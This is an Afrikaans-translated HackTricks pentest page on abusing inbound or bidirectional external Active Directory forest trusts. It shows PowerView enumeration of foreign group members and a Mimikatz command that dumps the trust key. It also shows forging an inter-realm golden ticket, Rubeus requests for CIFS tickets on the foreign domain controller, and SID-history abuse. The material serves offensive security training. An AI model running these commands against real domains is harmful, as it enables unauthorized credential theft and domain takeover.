# Eksterne Bosdomein - Eenrigting (Inkomend) of bidireksioneel

{{#include ../../banners/hacktricks-training.md}}

In hierdie scenario vertrou 'n eksterne domein jou (of albei vertrou mekaar), sodat jy 'n soort toegang daaroor kan verkry.

## Enumerasie

Eerstens moet jy die **vertroue** **enumerate**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
In die vorige opsomming is gevind dat die gebruiker **`crossuser`** binne die **`External Admins`** groep is wat **Admin toegang** het binne die **DC van die eksterne domein**.

## Begin Toegang

As jy **nie** enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om **privesc van 'n onprivilegieerde gebruiker** te doen (goed soos kerberoasting byvoorbeeld):

Jy kan **Powerview funksies** gebruik om die **ander domein** te **opsom** met die `-Domain` param soos in:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Vervalsing

### Aanmelding

Deur 'n gewone metode te gebruik met die geloofsbriewe van die gebruikers wat toegang het tot die eksterne domein, behoort jy toegang te hê tot:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID Geskiedenis Misbruik

Jy kan ook [**SID Geskiedenis**](sid-history-injection.md) oor 'n woud vertroue misbruik.

As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering nie geaktiveer is nie**, word dit moontlik om **'n SID van die ander woud** by te voeg, en hierdie **SID** sal by die **gebruiker se token** gevoeg word wanneer hulle **oor die vertroue** autentiseer.

> [!WARNING]
> Ter herinnering, jy kan die ondertekeningssleutel kry met
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Jy kan **onderteken met** die **vertroude** sleutel 'n **TGT wat die** gebruiker van die huidige domein **naboots**.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Volledige manier om die gebruiker na te doen
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
